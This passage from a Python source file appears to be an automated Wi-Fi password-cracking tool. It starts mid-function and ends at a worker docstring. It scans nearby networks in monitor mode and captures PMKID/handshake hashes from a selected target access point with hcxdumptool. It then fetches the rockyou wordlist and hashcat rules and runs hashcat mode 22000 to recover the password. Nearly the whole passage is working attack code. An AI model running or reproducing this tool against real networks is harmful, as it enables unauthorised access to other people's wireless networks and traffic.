    info(f"Starting full-spectrum scan on  {c(interface, C.BWHITE, C.BOLD)}")
    ORIGINAL_IFACE = interface   # always track so cleanup can restore it

    monitor_iface = None
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
        subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                       capture_output=True, text=True, timeout=15)
        monitor_iface = get_monitor_interface(interface)
        if not os.path.exists(f'/sys/class/net/{monitor_iface}'):
            monitor_iface = f'{interface}mon'
        if not os.path.exists(f'/sys/class/net/{monitor_iface}'):
            monitor_iface = interface
        MONITOR_IFACE = monitor_iface
        ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")
    except Exception as e:
        err(f"Monitor mode error: {e}")
        return scan_networks_alternative(interface)

    all_nets = {}

    def merge(net_list):
        for net in net_list:
            if not net.bssid:
                continue
            if net.bssid not in all_nets or net.signal > all_nets[net.bssid].signal:
                all_nets[net.bssid] = net

    def airodump_pass(band_flag, band_label, secs):
        tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
        cap_base = os.path.join(tmpdir, 'scan')
        try:
            proc = subprocess.Popen(
                ['sudo', 'airodump-ng', '--band', band_flag,
                 '--output-format', 'csv', '-w', cap_base,
                 '--write-interval', '2', monitor_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            pb = ProgressBar(secs, label=f'Scan {band_label:<8}')
            pb.start()
            time.sleep(secs)
            pb.stop()
            proc.terminate()
            try: proc.wait(timeout=5)
            except Exception: pass
        except Exception as e:
            try: pb.stop()
            except Exception: pass
            warn(f"airodump ({band_label}) error: {e}")
        nets = _parse_airodump_csv_dir(tmpdir)
        shutil.rmtree(tmpdir, ignore_errors=True)
        return nets

    if check_tool('airodump-ng'):
        info("Pass 1/3 — airodump 2.4 GHz (45 s)…")
        merge(airodump_pass('bg', '2.4GHz', 45))
        ok(f"After 2.4 GHz: {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} network(s)")

        info("Pass 2/3 — airodump 5 GHz (45 s)…")
        before = len(all_nets)
        merge(airodump_pass('a', '5GHz', 45))
        ok(f"After 5 GHz:   +{len(all_nets)-before} new  →  {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} total")
    else:
        warn("airodump-ng not found — skipping passes 1 and 2")

    if SCAPY_AVAILABLE:
        channels_all = list(range(1, 15)) + [
            36, 40, 44, 48, 52, 56, 60, 64,
            100,104,108,112,116,120,124,128,
            132,136,140,144,149,153,157,161,165
        ]
        stop_hop   = threading.Event()
        hop_thread = threading.Thread(
            target=channel_hopper,
            args=(monitor_iface, channels_all, stop_hop, 0.3),
            daemon=True
        )

        scapy_nets = []
        before     = len(all_nets)

        def pkt_handler(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            try:
                ssid        = '<Hidden>'
                ch          = None
                sig         = -100
                has_rsn     = False
                has_wpa     = False
                auth_suites = []

                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0 and elt.info:
                        try:
                            decoded = elt.info.decode('utf-8', errors='replace').strip('\x00').strip()
                            if decoded:
                                ssid = decoded
                        except Exception:
                            pass
                    elif elt.ID == 3 and elt.info:
                        ch = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
                    elif elt.ID == 48:
                        has_rsn = True
                        try:
                            raw = bytes(elt.info)
                            if len(raw) >= 8:
                                pc      = int.from_bytes(raw[4:6], 'little')
                                akm_off = 6 + pc * 4
                                if len(raw) >= akm_off + 2:
                                    ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
                                    for i in range(ac):
                                        so = akm_off + 2 + i * 4
                                        if len(raw) >= so + 4:
                                            auth_suites.append(raw[so + 3])
                        except Exception:
                            pass
                    elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
                        has_wpa = True
                    try:
                        nxt = elt.payload
                        elt = nxt.getlayer(Dot11Elt) if nxt and hasattr(nxt, 'getlayer') else None
                    except Exception:
                        break

                if hasattr(pkt, 'dBm_AntSignal'):
                    sig = pkt.dBm_AntSignal

                bssid = pkt.addr2
                if not bssid:
                    return

                if has_rsn and 8 in auth_suites:
                    sec = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
                elif has_rsn:
                    sec = 'WPA2'
                elif has_wpa:
                    sec = 'WPA'
                else:
                    sec = 'OPEN'

                scapy_nets.append(Network(ssid=ssid, bssid=bssid,
                                          channel=ch, signal=sig, security=sec))
            except Exception:
                pass

        info("Pass 3/3 — scapy + channel hopper (60 s, all 2.4+5 GHz channels)…")
        try:
            hop_thread.start()
            pb = ProgressBar(60, label='Scapy hopping ')
            pb.start()
            sniff(iface=monitor_iface, prn=pkt_handler, timeout=60, store=False)
            pb.stop()
        except Exception as e:
            try: pb.stop()
            except Exception: pass
            warn(f"Scapy error: {e}")
        finally:
            stop_hop.set()
            hop_thread.join(timeout=3)

        merge(scapy_nets)
        ok(f"After scapy:   +{len(all_nets)-before} new  →  {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} total")
    else:
        warn("Scapy not available — install python3-scapy for best coverage")

    try:
        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                       capture_output=True, timeout=10)
        MONITOR_IFACE = None
        restart_network_manager()
    except Exception:
        pass

    result = sorted(all_nets.values(), key=lambda x: x.signal, reverse=True)
    if not result:
        warn("No networks found — falling back to iw scan…")
        return scan_networks_alternative(interface)

    ok(f"Scan complete — {c(str(len(result)), C.BYELLOW, C.BOLD)} unique network(s) found")
    return result


def scan_networks_alternative(interface):
    """Alternative network scanning using iw scan — parses RSN/WPA IEs for security type."""
    info("Using iw scan method…")
    networks = []

    IW_TIMEOUT = 30
    pb = ProgressBar(IW_TIMEOUT, label='Scanning  (iw) ')
    pb.start()

    try:
        cmd    = ['sudo', 'iw', 'dev', interface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=IW_TIMEOUT + 5)
        pb.stop()

        if result.returncode != 0:
            err(f"iw scan failed: {result.stderr.strip()[:200]}")
            return []

        lines           = result.stdout.split('\n')
        current_bssid   = None
        current_ssid    = None
        current_signal  = -100
        current_channel = None
        current_rsn     = ''
        current_wpa     = ''
        current_privacy = ''

        def flush_ap():
            if current_bssid and current_ssid:
                sec = detect_security_from_iw(current_rsn, current_wpa, current_privacy)
                networks.append(Network(
                    ssid=current_ssid, bssid=current_bssid,
                    channel=current_channel, signal=current_signal,
                    security=sec
                ))

        for line in lines:
            ls = line.strip()

            bss_match = re.match(r'BSS\s+([0-9a-fA-F:]{17})', ls)
            if bss_match:
                flush_ap()
                current_bssid   = bss_match.group(1)
                current_ssid    = '<Unknown>'
                current_signal  = -100
                current_channel = None
                current_rsn     = ''
                current_wpa     = ''
                current_privacy = ''
            elif 'signal:' in ls.lower():
                m = re.search(r'signal:\s*([-\d.]+)', ls, re.IGNORECASE)
                if m:
                    try: current_signal = int(float(m.group(1)))
                    except Exception: pass
            elif 'DS Parameter set: channel' in ls:
                m = re.search(r'channel\s+(\d+)', ls)
                if m:
                    try: current_channel = int(m.group(1))
                    except Exception: pass
            elif re.match(r'SSID:', ls):
                try: current_ssid = ls.split(':', 1)[1].strip() or '<Hidden>'
                except Exception: pass
            # RSN IE block (WPA2/WPA3)
            elif 'RSN' in ls or 'rsn' in ls.lower():
                current_rsn += ls.lower() + ' '
            # WPA vendor IE
            elif 'WPA' in ls and 'WPA2' not in ls and 'Version' not in ls:
                current_wpa += ls.lower() + ' '
            elif 'Authentication suites' in ls:
                current_rsn += ls.lower() + ' '
                current_wpa += ls.lower() + ' '
            elif 'capability' in ls.lower() and 'Privacy' in ls:
                current_privacy += 'on'

        flush_ap()  # commit last AP

    except subprocess.TimeoutExpired:
        try: pb.stop()
        except Exception: pass
        err("iw scan timed out")
    except Exception as e:
        try: pb.stop()
        except Exception: pass
        err(f"Alternative scan failed: {e}")

    return sorted(networks, key=lambda x: x.signal, reverse=True)


def display_networks_menu(networks):
    """Display a styled networks table with security type and return the chosen index."""
    if not networks:
        err("No networks found")
        return -1

    total     = len(networks)
    page_size = 50
    page      = 0

    while True:
        start_idx     = page * page_size
        end_idx       = min(start_idx + page_size, total)
        nets          = networks[start_idx:end_idx]

        section(f"Networks  ·  {total} found  ·  showing {start_idx+1}–{end_idx}")

        hdr = (f"  {c('#', C.BWHITE, C.BOLD):>4}  "
               f"{c('SSID', C.BWHITE, C.BOLD):<28}  "
               f"{c('Security', C.BWHITE, C.BOLD):<10}  "
               f"{c('BSSID', C.BWHITE, C.BOLD):17}  "
               f"{c('Ch', C.BWHITE, C.BOLD):>3}  "
               f"{c('Signal', C.BWHITE, C.BOLD):>7}  "
               f"{c('Bar', C.BWHITE, C.BOLD)}")
        print(hdr)
        divider()

        for i, net in enumerate(nets, start_idx + 1):
            raw_ssid = net.ssid or '<Hidden>'
            ssid     = (raw_ssid[:25] + c('…', C.DIM)) if len(raw_ssid) > 25 else raw_ssid
            ch       = str(net.channel) if net.channel else c('?', C.DIM)
            bssid    = net.bssid or c('??:??:??:??:??:??', C.DIM)
            sig      = net.signal
            sec      = getattr(net, 'security', 'UNKNOWN')

            if sec == 'WPA3':
                sec_str = c('WPA3      ', C.BGREEN,   C.BOLD)
            elif sec == 'WPA3/WPA2':
                sec_str = c('WPA3/WPA2 ', C.BCYAN,    C.BOLD)
            elif sec == 'WPA2':
                sec_str = c('WPA2      ', C.BYELLOW,  C.BOLD)
            elif sec == 'WPA':
                sec_str = c('WPA       ', C.YELLOW,   C.BOLD)
            elif sec == 'WEP':
                sec_str = c('WEP       ', C.BRED,     C.BOLD)
            elif sec == 'OPEN':
                sec_str = c('OPEN      ', C.BMAGENTA, C.BOLD)
            else:
                sec_str = c('UNKNOWN   ', C.DIM)

            if sig >= -55:
                sig_col = C.BGREEN;  bars = '▂▄▆█'
            elif sig >= -70:
                sig_col = C.BYELLOW; bars = '▂▄▆░'
            elif sig >= -80:
                sig_col = C.YELLOW;  bars = '▂▄░░'
            else:
                sig_col = C.BRED;    bars = '▂░░░'

            num_s  = c(f'{i:>4}', C.BYELLOW, C.BOLD)
            ssid_s = c(f'{ssid:<28}', C.BWHITE)
            bss_s  = c(f'{bssid:17}', C.DIM)
            ch_s   = c(f'{ch:>3}', C.BCYAN)
            sig_s  = c(f'{sig:>4} dBm', sig_col)
            bar_s  = c(f'  {bars}', sig_col, C.BOLD)

            print(f"  {num_s}  {ssid_s}  {sec_str}  {bss_s}  {ch_s}  {sig_s}{bar_s}")

        divider()
        has_more = end_idx < total
        has_prev = page > 0
        nav = []
        if has_more: nav.append(c('n', C.BCYAN, C.BOLD) + c('=next', C.DIM))
        if has_prev: nav.append(c('p', C.BCYAN, C.BOLD) + c('=prev', C.DIM))
        nav.append(c('q', C.DIM) + c('=quit', C.DIM))
        print(f"  {' · '.join(nav)}")
        print()

        while True:
            raw = ask(f"Select (1–{total}) or n/p/q:").strip().lower()
            if raw == 'q':
                return -1
            if raw == 'n' and has_more:
                page += 1
                break
            if raw == 'p' and has_prev:
                page -= 1
                break
            try:
                choice = int(raw)
                if 1 <= choice <= total:
                    return choice - 1
                warn(f"Enter a number between 1 and {total}")
            except ValueError:
                if raw not in ('n', 'p'):
                    warn("Invalid — enter a number, or n/p/q")


def restart_network_manager():
    """Restart network manager service."""
    services = ['NetworkManager', 'networkmanager', 'network-manager',
                'wpa_supplicant', 'networking']
    for svc in services:
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', svc],
                           capture_output=True, timeout=8)
        except Exception:
            pass


def get_hcxdumptool_flags(mon_iface, pcapng_file, filter_file):
    """
    Interrogate hcxdumptool --help at runtime and build a safe command.
    Returns (cmd_list, info_string).

    Important constraint: --rcascan is a SCAN-ONLY mode and cannot be combined
    with -w (capture output). We never add any scan/roam flag — hcxdumptool
    captures passively on whatever channel the interface is already tuned to,
    which is correct because we lock to the target channel before calling this.
    """
    helptext = ''
    try:
        for hflag in ['-h', '--help']:
            r = subprocess.run(
                ['hcxdumptool', hflag],
                capture_output=True, text=True, timeout=10
            )
            helptext += (r.stdout + r.stderr).lower()
    except Exception:
        pass

    notes = []

    # ── Output file flag (-w v7+, -o v6) ─────────────────────────────
    if re.search(r'\s-w[\s,]', helptext) or '--write' in helptext:
        out_flag = '-w'
    else:
        out_flag = '-o'
    notes.append(f"out={out_flag}")

    cmd = ['sudo', 'hcxdumptool', '-i', mon_iface, out_flag, pcapng_file]

    # ── Active beacon flag — only add if it can coexist with -w ──────
    # --active_beacon (v6) is safe with -o/-w
    # --rcascan / --do_rcascan are SCAN modes, incompatible with -w — NEVER add
    if re.search(r'--active[_-]beacon', helptext):
        cmd.append('--active_beacon')
        notes.append('active=--active_beacon')
    else:
        # Passive only — rely on channel lock set before launch
        notes.append('mode=passive(channel-locked)')

    # ── Status flag (optional cosmetic) ──────────────────────────────
    if '--enable_status' in helptext:
        cmd.append('--enable_status=3')

    # ── AP filter ─────────────────────────────────────────────────────
    if filter_file:
        if '--filterlist_ap' in helptext:
            cmd += [f'--filterlist_ap={filter_file}', '--filtermode=2']
            notes.append('filter=bssid')
        elif '--filterlist' in helptext:
            cmd += [f'--filterlist={filter_file}', '--filtermode=2']
            notes.append('filter=bssid(legacy)')
        else:
            notes.append('filter=unavailable')

    return cmd, '  '.join(notes)


def capture_pmkid(interface, bssid, channel, ssid, timeout=300):
    """
    Capture PMKID from the target AP using hcxdumptool.

    Runs for up to `timeout` seconds (default 5 minutes) but exits early
    the moment a valid PMKID/EAPOL hash is found.  Sends active association
    requests every 30 s to elicit a PMKID response from the AP.

    Key fixes vs previous version:
      - Interface put into monitor mode BEFORE hcxdumptool starts
      - Correct flag names for both old (<= 6.x) and new (>= 22.x) hcxdumptool
      - Hash file written to a fresh path each run — never overwritten mid-poll
      - pcapng file size tracked across polls; growing = AP is responding
      - Elapsed timer shown live so user sees progress
    """
    global MONITOR_IFACE

    if not check_tool('hcxdumptool'):
        warn("hcxdumptool not available — skipping PMKID capture")
        return None

    info(f"PMKID capture  →  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}")
    info(f"Will run for up to  {c(str(timeout) + 's', C.BYELLOW, C.BOLD)}  — exits early on success")

    safe_ssid   = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    ts          = int(time.time())
    pcapng_file = f'/tmp/pmkid_{safe_ssid}_{ts}.pcapng'
    hash_file   = f'pmkid_{safe_ssid}_{ts}.hc22000'
    filter_file = f'/tmp/pmkid_filter_{safe_ssid}.txt'

    # ── BSSID filter so we only capture traffic from the target AP ──
    bssid_clean = bssid.replace(':', '').lower()
    try:
        with open(filter_file, 'w') as fh:
            fh.write(bssid_clean + '\n')
    except Exception:
        filter_file = None

    # ── Kill interfering processes then enable monitor mode ──────────
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    info(f"Enabling monitor mode on  {c(interface, C.BWHITE)}…")
    ORIGINAL_IFACE = interface   # track so cleanup always knows the real name
    try:
        subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                       capture_output=True, timeout=15)
        mon_iface = get_monitor_interface(interface)
        # If airmon-ng didn't create a new interface, set channel manually and use as-is
        if not os.path.exists(f'/sys/class/net/{mon_iface}'):
            mon_iface = interface
            subprocess.run(['sudo', 'ip', 'link', 'set', mon_iface, 'up'],
                           capture_output=True, timeout=5)
        MONITOR_IFACE = mon_iface
        ok(f"Monitor interface  {c(mon_iface, C.BWHITE, C.BOLD)}")
    except Exception as e:
        warn(f"Could not enable monitor mode: {e} — trying on raw interface")
        mon_iface = interface

    # Lock to target channel so we don't miss PMKID frames
    try:
        subprocess.run(['sudo', 'iw', 'dev', mon_iface, 'set', 'channel', str(channel)],
                       capture_output=True, timeout=5)
        info(f"Locked to channel  {c(str(channel), C.BCYAN)}")
    except Exception:
        pass

    # ── Build hcxdumptool command from runtime help introspection ────
    cmd, flag_notes = get_hcxdumptool_flags(mon_iface, pcapng_file, filter_file)
    info(f"Flags detected:  {c(flag_notes, C.DIM)}")
    info(f"Command:  {c(' '.join(cmd), C.DIM)}")
    print()

    proc        = None
    found_pmkid = False
    pb          = None

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # Determine which converter binary is available
        converter = None
        for cv in ['hcxpcapngtool', 'hcxpcaptool']:
            if check_tool(cv):
                converter = cv
                break

        if not converter:
            warn("Neither hcxpcapngtool nor hcxpcaptool found — cannot convert captures")

        pb    = ProgressBar(timeout, label='PMKID hunting  ')
        pb.start()

        start        = time.time()
        last_size    = 0
        last_convert = 0
        convert_interval = 10   # try conversion every 10 s

        while time.time() - start < timeout:
            # Check if hcxdumptool died early
            if proc.poll() is not None:
                stderr_out = proc.stdout.read() if proc.stdout else ''
                pb.stop()
                pb = None
                warn(f"hcxdumptool exited early (rc={proc.returncode})")
                if stderr_out:
                    warn(f"Output: {stderr_out.strip()[:300]}")
                break

            now      = time.time()
            cur_size = os.path.getsize(pcapng_file) if os.path.exists(pcapng_file) else 0

            # Show live feedback on whether packets are arriving
            if cur_size > last_size:
                last_size = cur_size

            # Attempt conversion every `convert_interval` seconds once file is non-trivial
            if converter and cur_size > 100 and (now - last_convert) >= convert_interval:
                last_convert = now
                try:
                    r = subprocess.run(
                        [converter, '-o', hash_file, pcapng_file],
                        capture_output=True, text=True, timeout=20
                    )
                    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                        found_pmkid = True
                        pb.stop()
                        pb = None
                        elapsed = int(time.time() - start)
                        ok(f"PMKID captured!  {c(hash_file, C.BWHITE)}  "
                           f"(elapsed {elapsed}s,  pcapng {cur_size} bytes)")
                        break
                except Exception:
                    pass

            time.sleep(2)

        if pb:
            pb.stop()
            pb = None

    except KeyboardInterrupt:
        if pb:
            try: pb.stop()
            except Exception: pass
        print()
        warn("PMKID capture interrupted by user")
        found_pmkid = False

    except Exception as e:
        if pb:
            try: pb.stop()
            except Exception: pass
        warn(f"PMKID capture error: {e}")
        found_pmkid = False

    finally:
        if proc and proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=5)
            except Exception: pass
        # Stop monitor mode
        if MONITOR_IFACE:
            try:
                subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                               capture_output=True, timeout=10)
                MONITOR_IFACE = None
            except Exception:
                pass
        restart_network_manager()

    # ── Final conversion pass on whatever was captured ───────────────
    if not found_pmkid and os.path.exists(pcapng_file):
        cur_size = os.path.getsize(pcapng_file)
        if cur_size > 100:
            info(f"Running final conversion on {cur_size}-byte capture…")
            converter = next(
                (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
            )
            if converter:
                try:
                    subprocess.run([converter, '-o', hash_file, pcapng_file],
                                   capture_output=True, timeout=20)
                    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                        found_pmkid = True
                        ok(f"PMKID extracted in final pass!  {c(hash_file, C.BWHITE)}")
                except Exception as e:
                    warn(f"Final conversion failed: {e}")
        else:
            warn(f"pcapng file too small ({cur_size} bytes) — AP may not support PMKID")
            info("Some APs (especially WPA3-SAE only) will never emit a PMKID")
            info("The handshake capture phase will still work on these APs")

    if not found_pmkid:
        warn("No PMKID captured — proceeding to handshake capture")

    return hash_file if found_pmkid else None


ROCKYOU_URLS = [
    'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
    'https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/rockyou.txt.gz',
]
ROCKYOU_LOCAL = '/opt/wordlists/rockyou.txt'


def find_or_fetch_wordlist():
    """
    Find the best available wordlist.  Priority:
      1. Any known system path that already exists
      2. Decompress rockyou.txt.gz if found
      3. Download rockyou.txt from GitHub (~130 MB) with progress
      4. Ask the user for a custom path
      5. Fall back to a minimal built-in list (last resort)
    Returns the path to a usable plaintext wordlist.
    """
    candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/john/password.lst',
        '/usr/share/wordlists/fasttrack.txt',
        '/usr/share/dict/words',
        os.path.expanduser('~/rockyou.txt'),
    ]

    # 1. Already exists?
    for path in candidates:
        if os.path.exists(path) and os.path.getsize(path) > 100_000:
            ok(f"Wordlist found:  {c(path, C.BWHITE)}  "
               f"({os.path.getsize(path)//1_000_000} MB)")
            return path

    # 2. Decompress .gz if present?
    gz_candidates = [
        '/usr/share/wordlists/rockyou.txt.gz',
        '/opt/wordlists/rockyou.txt.gz',
    ]
    for gz in gz_candidates:
        if os.path.exists(gz):
            dest = gz.replace('.gz', '')
            info(f"Decompressing {gz}…")
            try:
                import gzip
                with gzip.open(gz, 'rb') as fin, open(dest, 'wb') as fout:
                    shutil.copyfileobj(fin, fout)
                ok(f"Decompressed to  {c(dest, C.BWHITE)}")
                return dest
            except Exception as e:
                warn(f"Decompression failed: {e}")

    # 3. Try to download rockyou.txt
    warn("No wordlist found on this system.")
    info("rockyou.txt (~130 MB) is needed for effective cracking.")
    resp = ask("Download rockyou.txt now? [Y/n]")
    if resp.strip().lower() in ('', 'y', 'yes'):
        os.makedirs(os.path.dirname(ROCKYOU_LOCAL), exist_ok=True)
        downloaded = False
        for url in ROCKYOU_URLS:
            info(f"Downloading from  {c(url, C.DIM)}")
            try:
                import urllib.request
                tmp_path = ROCKYOU_LOCAL + '.tmp'

                def reporthook(count, block_size, total_size):
                    if total_size > 0:
                        pct  = min(count * block_size / total_size, 1.0)
                        done = int(40 * pct)
                        bar  = c('█' * done, C.BCYAN, C.BOLD) + c('░' * (40 - done), C.DIM)
                        mb   = count * block_size / 1_000_000
                        tot  = total_size / 1_000_000
                        print(f"\r  [{bar}]  {mb:.1f}/{tot:.1f} MB  ", end='', flush=True)

                urllib.request.urlretrieve(url, tmp_path, reporthook)
                print()

                # If it's a .gz, decompress it
                if url.endswith('.gz') or tmp_path.endswith('.gz'):
                    import gzip
                    info("Decompressing…")
                    with gzip.open(tmp_path, 'rb') as fin, open(ROCKYOU_LOCAL, 'wb') as fout:
                        shutil.copyfileobj(fin, fout)
                    os.remove(tmp_path)
                else:
                    os.rename(tmp_path, ROCKYOU_LOCAL)

                if os.path.exists(ROCKYOU_LOCAL) and os.path.getsize(ROCKYOU_LOCAL) > 100_000:
                    ok(f"rockyou.txt saved to  {c(ROCKYOU_LOCAL, C.BWHITE)}  "
                       f"({os.path.getsize(ROCKYOU_LOCAL)//1_000_000} MB)")
                    downloaded = True
                    return ROCKYOU_LOCAL
            except Exception as e:
                warn(f"Download failed ({url}): {e}")

        if not downloaded:
            err("All download attempts failed.")
            info("You can manually place rockyou.txt at:  /opt/wordlists/rockyou.txt")

    # 4. Ask for custom path
    resp = ask("Enter path to a wordlist file (or press Enter to use built-in mini list):")
    custom = resp.strip()
    if custom and os.path.exists(custom) and os.path.getsize(custom) > 0:
        ok(f"Using custom wordlist:  {c(custom, C.BWHITE)}")
        return custom
    if custom:
        warn(f"File not found: {custom}")

    # 5. Absolute last resort — tiny built-in list
    warn("Using built-in mini wordlist — very unlikely to crack a real password!")
    warn("Get rockyou.txt for serious cracking: place it at /opt/wordlists/rockyou.txt")
    mini = '/tmp/niixkey_mini.txt'
    with open(mini, 'w') as f:
        f.write('\n'.join([
            'password', '12345678', 'admin', 'qwerty', '123456789',
            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
            'internet', 'router123', 'connect', '00000000', '11111111',
        ]))
    return mini


def hashcat_is_functional():
    """
    Quick probe: run `hashcat -I` to list OpenCL/CUDA devices.
    Returns True only if at least one backend device is available.
    Installs pocl-opencl-icd if no devices found and apt-get is available.
    """
    if not check_tool('hashcat'):
        return False

    def probe():
        try:
            r = subprocess.run(['hashcat', '-I'], capture_output=True, text=True, timeout=10)
            out = (r.stdout + r.stderr).lower()
            return 'backend device' in out and 'no devices' not in out
        except Exception:
            return False

    if probe():
        return True

    # Try installing CPU OpenCL runtime
    warn("hashcat: no OpenCL devices — attempting to install pocl-opencl-icd…")
    try:
        subprocess.run(
            ['sudo', 'apt-get', 'install', '-y', 'pocl-opencl-icd'],
            capture_output=True, timeout=120
        )
        if probe():
            ok("pocl installed — hashcat can now run on CPU")
            return True
    except Exception:
        pass

    warn("hashcat has no OpenCL/CUDA backend — will use aircrack-ng instead")
    warn("Fix manually:  sudo apt-get install pocl-opencl-icd")
    return False


def get_bundled_rules_dir():
    """
    Write a minimal set of hashcat-compatible mutation rules to /tmp/niixkey_rules/
    so cracking works even without internet or a hashcat install that includes rules.
    Returns the directory path.
    """
    rules_dir = '/tmp/niixkey_rules'
    os.makedirs(rules_dir, exist_ok=True)

    # best64-equivalent: most common transformations
    best64 = """\
:
l
u
c
r
d
$1
$2
$3
$!
$@
$#
^1
^2
^3
sa@
si1
so0
se3
ss5
$1$2$3
$1$2$3$4
$!$!
c$1
c$1$2$3
c$!
u$1
r$1
d$1
$s
ss5 se3 sa@
[ 
]
}
{
$0
$9
$123
$1234
$12345
$123456
$1234567
$12345678
$0$0$0
T0
T1
i0!
i0@
"""
    best64_path = os.path.join(rules_dir, 'best64.rule')
    if not os.path.exists(best64_path):
        open(best64_path, 'w').write(best64)

    # toggles: tries capitalising each letter position
    toggles = '\n'.join(f'T{i}' for i in range(20))
    toggles_path = os.path.join(rules_dir, 'toggles1.rule')
    if not os.path.exists(toggles_path):
        open(toggles_path, 'w').write(toggles)

    return rules_dir


def run_hashcat_attack(hash_file, wordlist, pot_file, extra_args=None, label='hashcat'):
    """
    Run a single hashcat mode-22000 attack and return the cracked password or None.
    Returns None immediately if hashcat exits with 'No devices found/left'.
    """
    cmd = [
        'hashcat', '-m', '22000', hash_file, wordlist,
        '--potfile-path', pot_file,
        '--status', '--status-timer=30',
        '-O', '--force',
    ]
    if extra_args:
        cmd += extra_args

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        no_devices = False
        for line in proc.stdout:
            stripped = line.strip()
            if not stripped:
                continue
            low = stripped.lower()
            if 'no devices found' in low or 'no devices left' in low:
                no_devices = True
                warn("hashcat: no OpenCL devices — cannot run GPU/CPU cracking")
                proc.terminate()
                break
            elif any(kw in low for kw in ('error', 'no hashes', 'invalid')):
                warn(stripped)
            elif 'exhausted' in low or 'recovered' in low:
                ok(stripped)
            else:
                print(f"  {c(stripped, C.DIM)}", end='\r', flush=True)
        proc.wait()
        print()
        if no_devices:
            return None
    except KeyboardInterrupt:
        try: proc.terminate(); proc.wait()
        except Exception: pass
        warn(f"{label} interrupted")
        return None
    except Exception as e:
        warn(f"{label} error: {e}")
        return None

    if os.path.exists(pot_file) and os.path.getsize(pot_file) > 0:
        try:
            lines = open(pot_file).read().strip().splitlines()
            for line in reversed(lines):
                line = line.strip()
                if ':' in line:
                    return line.rsplit(':', 1)[-1]
        except Exception:
            pass
    return None


def find_hashcat_rules():
    """
    Return a dict of label -> path for available hashcat rule files.
    If rules aren't found locally, download them from the hashcat GitHub repo.
    """
    search_dirs = [
        '/usr/share/hashcat/rules',
        '/usr/lib/hashcat/rules',
        '/opt/hashcat/rules',
        os.path.expanduser('~/.local/share/hashcat/rules'),
        '/opt/wordlists/rules',
    ]
    wanted = {
        'best64':    'best64.rule',
        'dive':      'dive.rule',
        'toggles1':  'toggles1.rule',
        'leetspeak': 'leetspeak.rule',
        'd3ad0ne':   'd3ad0ne.rule',
    }
    found = {}
    for d in search_dirs:
        if not os.path.isdir(d):
            continue
        for label, filename in wanted.items():
            if label not in found:
                path = os.path.join(d, filename)
                if os.path.exists(path):
                    found[label] = path

    # Download missing rules from hashcat GitHub
    missing = [lbl for lbl in wanted if lbl not in found]
    if missing:
        rules_dir = '/opt/wordlists/rules'
        base_url  = 'https://raw.githubusercontent.com/hashcat/hashcat/master/rules'
        try:
            import urllib.request
            os.makedirs(rules_dir, exist_ok=True)
            for label in missing:
                filename = wanted[label]
                dest     = os.path.join(rules_dir, filename)
                url      = f'{base_url}/{filename}'
                try:
                    info(f"Downloading rule:  {c(filename, C.DIM)}")
                    urllib.request.urlretrieve(url, dest)
                    if os.path.exists(dest) and os.path.getsize(dest) > 0:
                        found[label] = dest
                        ok(f"Downloaded {filename}")
                except Exception as e:
                    warn(f"Could not download {filename}: {e}")
        except Exception as e:
            warn(f"Rule download failed: {e}")

    if found:
        ok(f"Hashcat rules available: {c(', '.join(found.keys()), C.DIM)}")
    else:
        warn("No hashcat rules found — stages 2 and 3 will be skipped")

    return found



def parse_hc22000(hash_file):
    """
    Parse an hc22000 file and return a list of PMKID dicts.
    WPA*01 lines contain PMKID data; WPA*02 lines contain EAPOL/MIC data.
    """
    entries = []
    try:
        with open(hash_file, 'r', errors='ignore') as fh:
            for line in fh:
                line = line.strip()
                if not line.startswith('WPA*01*'):
                    continue
                parts = line.split('*')
                if len(parts) < 6:
                    continue
                try:
                    pmkid_hex  = parts[2]
                    ap_mac_hex = parts[3]
                    cl_mac_hex = parts[4]
                    ssid_hex   = parts[5]
                    ssid = bytes.fromhex(ssid_hex).decode('utf-8', errors='replace')
                    entries.append({
                        'pmkid':    bytes.fromhex(pmkid_hex),
                        'ap_mac':   bytes.fromhex(ap_mac_hex),
                        'cl_mac':   bytes.fromhex(cl_mac_hex),
                        'ssid':     ssid,
                        'ssid_raw': ssid.encode('utf-8', errors='replace'),
                    })
                except Exception:
                    continue
    except Exception as e:
        warn(f"hc22000 parse error: {e}")
    return entries


def _verify_pmkid_worker(args):
    """
    Multiprocessing worker: verify a batch of passwords against one PMKID entry.
